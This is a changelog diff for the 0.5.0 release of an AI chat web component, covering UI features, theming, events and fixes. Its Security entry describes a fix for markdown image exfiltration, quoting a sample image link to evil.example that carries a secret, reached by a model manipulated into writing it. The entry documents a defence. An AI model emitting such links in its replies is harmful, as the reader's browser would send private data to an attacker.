@@ -6,6 +6,118 @@ adheres to [Semantic Versioning](https://semver.org/) and the format is based on
 
 ## [Unreleased]
 
+## [0.5.0] - 2026-10-08
+
+Long conversations, safer replies, and the fixes found by using the component
+in a real admin dashboard (Angular). **Two behaviour changes** to check when
+upgrading: images in replies no longer render unless you add `allow-images`, and
+on a narrow chat the sidebar is now a drawer instead of disappearing.
+
+### Added
+
+- **The sidebar on a narrow chat is a drawer.** Below **`aside-breakpoint`**
+  (560px by default) of the chat's OWN width — a phone, or a narrow panel on a
+  desktop — the sidebar slides over the conversation, opened by a built-in
+  toggle (in the header, or floating). Backdrop, Esc or a `conversation-id`
+  change closes it; focus moves in and back out; no slide on first render.
+  Drive it with **`aside-open`** (reflected) and **`hide-aside-toggle`**, follow
+  it with **`ai-chat:aside-toggle`** `{ open }`. New: `--ai-chat-aside-drawer-bg`,
+  `--ai-chat-aside-scrim`, parts `aside-toggle` / `aside-scrim`, slot
+  `aside-toggle-icon`, labels `openAside` / `closeAside`.
+  - **Behaviour change:** below 560px of SCREEN the sidebar used to vanish with
+    no way to reach it. `aside-breakpoint="0"` keeps it inline at every width.
+  - The header title now takes the free space, so it sits beside a leading
+    toggle; a trailing New-chat button still ends the row.
+
+- **Your own buttons in a message's actions row.** Set `messageActions` to a
+  function `(message) => MessageAction[]` (`{ id, label, icon?, disabled? }`)
+  and pressing one fires **`ai-chat:message-action`** `{ actionId, message,
+  index }` — e.g. "Download as Excel" only on answers that hold a table. A
+  callback, not a slot: a slotted node can't appear under every message, and
+  clones lose their listeners. Icons are SVG markup, sanitized; a callback that
+  throws shows no actions instead of breaking the chat. New part
+  `custom-action`; new exported type `MessageAction`.
+
+- **Reply content you can theme: tables, links, headings, lists.** Twelve new
+  variables, every default derived from the palette (so dark mode follows and
+  every app looks better without setting anything): `--ai-chat-table-header-bg`
+  / `-header-fg`, `--ai-chat-table-row-divider`, `--ai-chat-table-stripe-bg`,
+  `--ai-chat-table-cell-padding`, `--ai-chat-table-radius`,
+  `--ai-chat-link-color` / `-link-hover-color`, `--ai-chat-strong-fg`,
+  `--ai-chat-heading-fg`, `--ai-chat-marker-color`, `--ai-chat-blockquote-border`.
+  - **Behaviour change (visual):** tables now have a tinted header row, rules
+    between rows only (no vertical lines) inside a rounded frame, and tabular
+    numerals; markdown column alignment (`|--:|`) is honoured. Headings are
+    sized for a chat reply; `hr` is a thin rule. In dark mode links are lifted
+    off the accent so they stay readable (indigo on near-black was ~3:1).
+
+- **Dash-named events for framework templates.** Every `ai-chat:*` event also
+  fires as `ai-chat-*` (`ai-chat-message`, `ai-chat-new-chat`, …) with the same
+  detail; cancelling either cancels both. The README's Angular example was
+  wrong: Angular reads `(ai-chat:message)` as a global target and fails to
+  compile — it now binds `(ai-chat-message)`.
+
+- **`assistant-avatar-src` / `user-avatar-src`** — set an avatar from an image
+  URL, no slot needed. Slotted avatars are cloned into each message inside the
+  shadow DOM, so a framework component styled by page CSS rendered blank there;
+  the README now says so plainly.
+
+- **`--ai-chat-avatar-bg`** — the avatar tile on its own (it used to always
+  take the assistant bubble colour, so a transparent picture sat on a grey
+  square). Defaults to `--ai-chat-assistant-bg`, so nothing changes unless set.
+- **`--ai-chat-messages-scrollbar-gutter`** (default `stable`) and
+  **`--ai-chat-aside-scrollbar-gutter`** (default `auto`) — whether each
+  scroller reserves its scrollbar's width.
+  - **Behaviour change:** the history list no longer reserves an empty strip on
+    its edge when it doesn't scroll. Set it to `stable` for the old look.
+
+- **Long conversations: load earlier messages.** Show the newest page of a
+  conversation and load older ones as the reader scrolls up. Set
+  **`has-earlier`**; the component shows a "Load earlier messages" control at
+  the top and fires **`ai-chat:load-earlier`** `{ conversationId, oldest }` when
+  the reader nears the top or presses it; you answer with
+  **`prependMessages(older)`**, which adds them above while keeping exactly what
+  the reader was looking at in place. Fires once per load (no duplicate requests
+  on a fast scroll), keeps loading while a short history doesn't fill the view,
+  and drops a load that was out for a conversation no longer on screen.
+  **`load-earlier="button"`** loads only on a click. New parts `load-earlier` /
+  `load-earlier-row`, labels `loadEarlier` / `loadingEarlier`. The component
+  still never fetches — you own storage and paging.
+
+### Security
+
+- **Replies can no longer load URLs by themselves (markdown image
+  exfiltration).** DOMPurify's defaults let a reply contain `<img>`, so a model
+  talked into writing `![](https://evil.example/?d=<secret>)` made the reader's
+  browser send the secret out the moment the reply rendered — and `style`
+  attributes/tags (`background:url()`, `@import`), `srcset`, media posters, SVG
+  images and image inputs could do the same. All of these are now removed;
+  an image renders as its alt text. Links always get `rel="noopener noreferrer"`.
+  - **Behaviour change:** images in replies no longer show by default. To keep
+    them, add **`allow-images`**, ideally with **`image-hosts`** — an allowlist
+    of URL prefixes (`https:` only, loaded with no referrer).
+  - Markdown task-list checkboxes still render.
+
+### Fixed
+
+- **Sending with no `.transport` now says so in the console.** It used to fire
+  only `ai-chat:error`, so an app that didn't listen saw the send button do
+  nothing at all. A `console.warn` explains it, once per element.
+
+- **`attr="false"` now turns a boolean attribute off, as the docs always said.**
+  Lit's stock converter treated any present attribute as true, so
+  `show-timestamps="false"` — the natural way to write it in an Angular or Vue
+  template — switched timestamps **on**. Applies to all 15 boolean attributes;
+  presence, `""` and `"true"` still mean on, and reflection is unchanged.
+
+- **Playground: sidebar clicks needed 3-4 presses while a reply streamed in the
+  background.** The history list was rebuilt on every
+  `ai-chat:background-message` token, which replaced the row under the cursor
+  between mousedown and mouseup so the click never fired. Per-token updates now
+  only sync the generating-dot in place (`syncDots()`); the list is rebuilt
+  only when a reply settles. If your own history sidebar does the same, don't
+  rebuild list DOM from a per-token event.
+
 ## [0.4.0] - 2026-08-20
 
 ### Added
@@ -429,7 +541,8 @@ Initial public release.
 - Accessibility: ARIA live region, keyboard support, reduced-motion.
 - Licensed under MPL-2.0.
 
-[Unreleased]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.4.0...HEAD
+[Unreleased]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.5.0...HEAD
+[0.5.0]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.4.0...v0.5.0
 [0.4.0]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.3.0...v0.4.0
 [0.3.0]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.2.0...v0.3.0
 [0.2.0]: https://github.com/MahmoudSr/ai-chat-element/compare/v0.1.5...v0.2.0
